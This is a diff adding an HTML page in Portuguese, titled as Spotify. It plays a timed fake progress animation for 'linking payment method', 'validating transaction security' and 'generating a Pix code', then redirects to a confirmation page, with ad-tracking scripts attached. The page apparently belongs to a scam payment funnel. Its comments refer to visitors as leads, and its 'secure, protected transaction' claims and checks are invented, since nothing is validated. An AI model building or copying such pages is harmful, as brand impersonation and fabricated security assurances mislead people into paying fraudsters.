@@ -1,0 +1,435 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8" />
+<script type="text/javascript">
+    (function(c,l,a,r,i,t,y){
+        c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
+        t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
+        y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
+    })(window, document, "clarity", "script", "uem62uib5t");
+</script>
+
+<!-- Facebook Pixel -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '1949165059042573');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none" src="https://www.facebook.com/tr?id=1597899204644792&ev=PageView&noscript=1"/></noscript>
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>Processando... | Spotify</title>
+
+<style>
+:root{
+  --bg:#050505;
+  --panel:#0c0c0c;
+  --line:#1f1f1f;
+  --green:#2cff5f;
+  --text:#fff;
+  --muted:#9a9a9a;
+}
+*{box-sizing:border-box;margin:0;padding:0}
+body{
+  background:var(--bg);
+  color:var(--text);
+  font-family:Inter,-apple-system,BlinkMacSystemFont,'Segoe UI',Arial,sans-serif;
+  font-size:16px;
+  min-height:100vh;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  padding:20px;
+}
+.wrap{
+  max-width:340px;
+  width:100%;
+}
+.card{
+  background:linear-gradient(180deg,#0b0b0b,#030303);
+  border:1px solid var(--line);
+  border-radius:20px;
+  padding:24px;
+}
+
+/* Header */
+.header{
+  display:flex;
+  flex-direction:column;
+  align-items:center;
+  text-align:center;
+  gap:8px;
+  margin-bottom:20px;
+}
+.header-icon{
+  width:48px;
+  height:48px;
+  border-radius:50%;
+  background:rgba(44,255,95,.1);
+  display:flex;
+  align-items:center;
+  justify-content:center;
+}
+.header-icon svg{
+  width:24px;
+  height:24px;
+  stroke:var(--green);
+  stroke-width:2.5;
+  fill:none;
+}
+.spinner-icon{
+  animation:spin 1s linear infinite;
+}
+.check-icon{
+  animation:fadeIn .3s ease;
+}
+.check-icon circle{
+  stroke-dasharray:63;
+  stroke-dashoffset:63;
+  animation:drawCircle .4s ease forwards;
+}
+.check-icon path:last-child{
+  stroke-dasharray:12;
+  stroke-dashoffset:12;
+  animation:drawCheck .3s ease .3s forwards;
+}
+@keyframes drawCircle{
+  to{stroke-dashoffset:0}
+}
+@keyframes drawCheck{
+  to{stroke-dashoffset:0}
+}
+.header h1{
+  font-size:16px;
+  font-weight:800;
+  color:var(--text);
+  line-height:1.3;
+}
+.header p{
+  font-size:11px;
+  color:var(--muted);
+}
+
+/* Progress Bar */
+.progress-container{
+  display:flex;
+  align-items:center;
+  gap:12px;
+  margin-bottom:20px;
+}
+.progress-bar{
+  flex:1;
+  height:8px;
+  background:#1a1a1a;
+  border-radius:999px;
+  overflow:hidden;
+}
+.progress-fill{
+  height:100%;
+  background:linear-gradient(90deg,#2cff5f,#1fdf50);
+  border-radius:999px;
+  transition:width .3s ease-out;
+  width:0%;
+}
+.progress-text{
+  font-size:11px;
+  font-family:monospace;
+  color:var(--muted);
+  width:36px;
+  text-align:right;
+}
+
+/* Steps */
+.steps{
+  display:flex;
+  flex-direction:column;
+  gap:10px;
+  margin-bottom:16px;
+}
+.step{
+  display:flex;
+  align-items:center;
+  gap:12px;
+  padding:10px 12px;
+  border-radius:12px;
+  border:1px solid var(--line);
+  background:#0a0a0a;
+  transition:all .3s;
+}
+.step.active{
+  background:rgba(44,255,95,.05);
+  border-color:rgba(44,255,95,.2);
+}
+.step.done{
+  background:rgba(44,255,95,.05);
+  border-color:rgba(44,255,95,.2);
+}
+.step-icon{
+  width:24px;
+  height:24px;
+  border-radius:50%;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  flex-shrink:0;
+  background:#1a1a1a;
+  transition:all .3s;
+}
+.step.done .step-icon{
+  background:var(--green);
+}
+.step.done .step-icon svg{
+  stroke:#000;
+  animation:fadeIn .3s ease;
+}
+.step.active .step-icon{
+  background:#1a1a1a;
+  border:2px solid var(--green);
+}
+.step.active .step-icon .spinner{
+  width:12px;
+  height:12px;
+  border:2px solid var(--green);
+  border-top-color:transparent;
+  border-radius:50%;
+  animation:spin .8s linear infinite;
+}
+.step-icon svg{
+  width:12px;
+  height:12px;
+  stroke:#666;
+  stroke-width:3;
+  fill:none;
+}
+.step-text{
+  font-size:12px;
+  font-weight:500;
+  color:#888;
+}
+.step.done .step-text,
+.step.active .step-text{
+  color:var(--text);
+}
+
+/* Security Badge */
+.security-badge{
+  background:rgba(44,255,95,.1);
+  border:1px solid rgba(44,255,95,.3);
+  border-radius:12px;
+  padding:12px;
+  display:flex;
+  align-items:center;
+  gap:8px;
+  animation:fadeIn .5s ease;
+}
+.security-badge svg{
+  width:16px;
+  height:16px;
+  stroke:var(--green);
+  fill:none;
+  flex-shrink:0;
+}
+.security-badge span{
+  font-size:12px;
+  font-weight:600;
+  color:var(--text);
+}
+
+/* Footer */
+.footer{
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  gap:6px;
+  font-size:10px;
+  color:var(--muted);
+  padding-top:12px;
+  border-top:1px solid rgba(255,255,255,.1);
+  margin-top:16px;
+}
+.footer svg{
+  width:10px;
+  height:10px;
+  stroke:currentColor;
+  fill:none;
+}
+
+/* Animations */
+@keyframes spin{
+  to{transform:rotate(360deg)}
+}
+@keyframes fadeIn{
+  from{opacity:0;transform:scale(.8)}
+  to{opacity:1;transform:scale(1)}
+}
+
+/* Responsive */
+@media(max-width:360px){
+  .card{
+    padding:20px;
+  }
+}
+</style>
+
+<script>
+document.addEventListener("DOMContentLoaded",()=>{
+
+  const params = new URLSearchParams(window.location.search);
+  
+  // Elementos
+  const progressFill = document.getElementById("progressFill");
+  const progressText = document.getElementById("progressText");
+  const steps = document.querySelectorAll(".step");
+  const spinnerIcon = document.getElementById("spinnerIcon");
+  const checkIcon = document.getElementById("checkIcon");
+  const headerTitle = document.getElementById("headerTitle");
+  const headerSubtitle = document.getElementById("headerSubtitle");
+  
+  let progress = 0;
+  let currentStep = 0;
+  
+  // Função para atualizar progresso
+  function updateProgress(){
+    if(progress < 100){
+      progress += 2;
+      progressFill.style.width = progress + "%";
+      progressText.textContent = progress + "%";
+      
+      // Ativar steps progressivamente (mais espaçados)
+      if(progress >= 20 && currentStep < 1){
+        currentStep = 1;
+        steps[0].classList.add("done");
+        steps[0].classList.remove("active");
+        steps[1].classList.add("active");
+      }
+      if(progress >= 45 && currentStep < 2){
+        currentStep = 2;
+        steps[1].classList.add("done");
+        steps[1].classList.remove("active");
+        steps[2].classList.add("active");
+      }
+      if(progress >= 70 && currentStep < 3){
+        currentStep = 3;
+        steps[2].classList.add("done");
+        steps[2].classList.remove("active");
+        steps[3].classList.add("active");
+      }
+      if(progress >= 100){
+        steps[3].classList.add("done");
+        steps[3].classList.remove("active");
+        
+        // Trocar ícone para check e atualizar textos
+        spinnerIcon.style.display = "none";
+        checkIcon.style.display = "block";
+        headerTitle.textContent = "Pagamento pronto para confirmação";
+        headerSubtitle.textContent = "Redirecionando para confirmação…";
+        
+        // Redirecionar após completar (1.5s para o lead ver 100%)
+        setTimeout(()=>{
+          window.location.href = "confirmar.html?" + params.toString();
+        },1500);
+      }
+    }
+  }
+  
+  // Iniciar com primeiro step ativo
+  steps[0].classList.add("active");
+  
+  // Atualizar a cada 80ms (mais lento para o lead ler)
+  const interval = setInterval(updateProgress, 80);
+  
+});
+</script>
+
+</head>
+
+<body>
+<div class="wrap">
+<div class="card">
+
+  <div class="header">
+    <div class="header-icon" id="headerIcon">
+      <svg viewBox="0 0 24 24" class="spinner-icon" id="spinnerIcon">
+        <path d="M21 12a9 9 0 1 1-6.219-8.56"/>
+      </svg>
+      <svg viewBox="0 0 24 24" class="check-icon" id="checkIcon" style="display:none">
+        <circle cx="12" cy="12" r="10"/>
+        <path d="m9 12 2 2 4-4"/>
+      </svg>
+    </div>
+    <h1 id="headerTitle">Preparando seu acesso prioritário…</h1>
+    <p id="headerSubtitle">Configurando processamento automático</p>
+  </div>
+
+  <div class="progress-container">
+    <div class="progress-bar">
+      <div class="progress-fill" id="progressFill"></div>
+    </div>
+    <span class="progress-text" id="progressText">0%</span>
+  </div>
+
+  <div class="steps">
+    <div class="step">
+      <div class="step-icon">
+        <svg viewBox="0 0 24 24"><path d="M20 6L9 17l-5-5"/></svg>
+      </div>
+      <span class="step-text">Carregando dados do perfil</span>
+    </div>
+    
+    <div class="step">
+      <div class="step-icon">
+        <svg viewBox="0 0 24 24"><path d="M20 6L9 17l-5-5"/></svg>
+      </div>
+      <span class="step-text">Vinculando método de pagamento</span>
+    </div>
+    
+    <div class="step">
+      <div class="step-icon">
+        <svg viewBox="0 0 24 24"><path d="M20 6L9 17l-5-5"/></svg>
+      </div>
+      <span class="step-text">Validando segurança da transação</span>
+    </div>
+    
+    <div class="step">
+      <div class="step-icon">
+        <svg viewBox="0 0 24 24"><path d="M20 6L9 17l-5-5"/></svg>
+      </div>
+      <span class="step-text">Gerando código Pix exclusivo</span>
+    </div>
+  </div>
+
+  <div class="security-badge">
+    <svg viewBox="0 0 24 24">
+      <path d="M20 13c0 5-3.5 7.5-7.66 8.95a1 1 0 0 1-.67-.01C7.5 20.5 4 18 4 13V6a1 1 0 0 1 1-1c2 0 4.5-1.2 6.24-2.72a1.17 1.17 0 0 1 1.52 0C14.51 3.81 17 5 19 5a1 1 0 0 1 1 1z"/>
+    </svg>
+    <span>Transação protegida e vinculada ao seu perfil</span>
+  </div>
+
+  <div class="footer">
+    <svg viewBox="0 0 24 24">
+      <rect width="18" height="11" x="3" y="11" rx="2" ry="2"/>
+      <path d="M7 11V7a5 5 0 0 1 10 0v4"/>
+    </svg>
+    Conexão criptografada · Ambiente seguro
+  </div>
+
+</div>
+</div>
+
+<script
+  src="https://cdn.utmify.com.br/scripts/utms/latest.js"
+  data-utmify-prevent-xcod-sck
+  data-utmify-prevent-subids
+  async
+  defer
+></script>
+
+</body>
+</html>
